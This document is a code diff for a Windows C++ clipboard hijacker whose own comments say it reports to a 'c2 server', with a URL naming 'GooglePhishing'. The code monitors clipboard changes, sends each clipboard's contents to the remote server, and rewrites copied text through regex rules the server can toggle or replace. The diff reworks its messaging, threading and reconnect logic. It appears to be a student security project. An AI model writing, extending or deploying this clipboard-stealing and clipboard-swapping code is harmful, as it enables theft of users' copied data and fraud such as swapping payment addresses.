@@ -27,12 +27,12 @@ const string DEFAULT_URL = "@cgi.cse.unsw.edu.au/~z5476230/GooglePhishing/?" + s
 // Function definitions
 ////////////////////////////////////////////////
 
-void sendMsg(std::string message);
+void sendMsg(string tag, string message);
 int getClipboardData(char *ret);
 LRESULT CALLBACK ClipWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
 void clipboardUpdated();
 void exitCleanup(int status);
-void threadCleanup(std::thread &thread_obj, std::atomic<bool> &quitFlag);
+void threadCleanup();
 int initCon();
 void sighandler(int sig);
 void handleCmd(string cmd);
@@ -45,7 +45,9 @@ void initRules();
 
 SOCKET sock;
 int ownData = false;
-bool debug = false;
+bool debug = true;
+std::atomic_bool quitFlag(false);
+std::thread thread_obj(listenMsg, std::ref(quitFlag));
 
 struct Rule
 {
@@ -155,7 +157,7 @@ void clipboardUpdated()
     return;
   }
   cout << ("clipboard updated\n");
-  sendMsg("[update] " + string(ret));
+  sendMsg("[update]", string(ret));
 
   parseRules(string(ret));
 }
@@ -191,7 +193,7 @@ void parseRules(string edit)
           edit = m.str(0) + edit;
         }
       }
-      sendMsg("[rule] " + rule.label + " replaced");
+      sendMsg("[rule]", rule.label + " replaced");
 
       setClipboardData(edit.data());
       return;
@@ -211,13 +213,13 @@ void changeRule(string cmd)
       {
         cmd.erase(0, strlen("toggle "));
         rule.enabled = startsWith(cmd, "true") ? true : false;
-        sendMsg("[rule] " + rule.label + " rule toggled to " + (rule.enabled ? "on" : "off"));
+        sendMsg("[rule]", rule.label + " rule toggled to " + (rule.enabled ? "on" : "off"));
       }
       if (startsWith(cmd, "output "))
       {
         cmd.erase(0, strlen("output "));
         rule.output = cmd;
-        sendMsg("[rule] " + rule.label + " rule output set to " + rule.output);
+        sendMsg("[rule]", rule.label + " rule output set to " + rule.output);
       }
       Sleep(1000);
       initRules();
@@ -231,7 +233,7 @@ void resetRules()
 {
   rules = defaultRules;
   initRules();
-  sendMsg("[rule] rules reset to default");
+  sendMsg("[rule]", "rules reset to default");
 }
 
 // send rules as an update to server
@@ -242,13 +244,15 @@ void initRules()
   {
     msg = msg + rule.label + " " + rule.reg + " " + rule.output + " " + (rule.enabled ? "true" : "false") + "\n";
   }
-  sendMsg(msg);
+  send(sock, msg.c_str(), msg.size(), 0);
 }
 
 // send notif to c2 server
-void sendMsg(string msg)
+void sendMsg(string tag, string msg)
 {
-  send(sock, msg.c_str(), msg.size(), 0);
+  cout << tag + " " + msg + "\n";
+  string full = tag + " " + regex_replace(msg, regex(R"([\[\]])"), R"(\\$&)");
+  send(sock, full.c_str(), full.size(), 0);
 }
 
 // handles window messages for a window that listens for clipboard updates
@@ -289,7 +293,7 @@ LRESULT CALLBACK ClipWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 void exitCleanup(int status)
 {
   cout << ("Exiting safely...\n");
-  sendMsg("[exit]");
+  sendMsg("[exit]", "");
   closesocket(sock);
   WSACleanup();
 
@@ -297,7 +301,7 @@ void exitCleanup(int status)
 }
 
 // cleans up threads
-void threadCleanup(std::thread &thread_obj, std::atomic<bool> &quitFlag)
+void threadCleanup()
 {
   quitFlag = true;
   if (thread_obj.joinable())
@@ -349,6 +353,7 @@ int initCon()
 void sighandler(int sig)
 {
   cout << ("User exit.\n");
+  threadCleanup();
   exitCleanup(0);
 
   exit(sig);
@@ -371,7 +376,7 @@ void handleCmd(string cmd)
   {
     cmd.erase(0, strlen("[replace] "));
     setClipboardData(cmd.data());
-    sendMsg("[rule] regex replaced to '" + cmd + "'");
+    sendMsg("[rule]", "regex replaced to '" + cmd + "'");
   }
 }
 
@@ -391,7 +396,7 @@ void listenMsg(std::atomic<bool> &quitFlag)
     buffer[bytesReceived] = '\0';
 
     // condition for server disconnect
-    if (bytesReceived <= 0 || strcmp(buffer, "[exit]") == 0)
+    if (bytesReceived <= 0)
     {
       // retry connection
       while (initCon() != 0)
@@ -399,6 +404,12 @@ void listenMsg(std::atomic<bool> &quitFlag)
         cout << ("Retrying connection...\n");
         std::this_thread::sleep_for(std::chrono::milliseconds(RETRY_INTERVAL));
       }
+    }
+    else if (strcmp(buffer, "[exit]") == 0)
+    {
+      cout << ("Server exit\n");
+      sendMsg("[exit]", "");
+      exitCleanup(0);
     }
     else
     {
@@ -432,22 +443,10 @@ int main()
     return 2;
   }
 
-  // connect to the c2 server
-  while (initCon() != 0)
-  {
-    cout << ("Server offline.\n");
-    cout << ("Retrying connection...\n");
-    std::this_thread::sleep_for(std::chrono::milliseconds(RETRY_INTERVAL));
-  }
-
   // set up signal handlers for program exit (eg. control c)
   signal(SIGABRT, &sighandler);
   signal(SIGTERM, &sighandler);
   signal(SIGINT, &sighandler);
-
-  // New thread for connection check
-  std::atomic_bool quitFlag(false);
-  std::thread thread_obj(listenMsg, std::ref(quitFlag));
 
   // message loop thread
   MSG msg;
@@ -458,7 +457,7 @@ int main()
     {
       cout << ("GetMessage error 0x%08X\n", GetLastError());
 
-      threadCleanup(thread_obj, quitFlag);
+      threadCleanup();
       exitCleanup(1);
     }
     // translates virtual key messages into character messages.
@@ -467,7 +466,7 @@ int main()
     DispatchMessage(&msg);
   }
 
-  threadCleanup(thread_obj, quitFlag);
+  threadCleanup();
   exitCleanup(0);
 
   return 0;
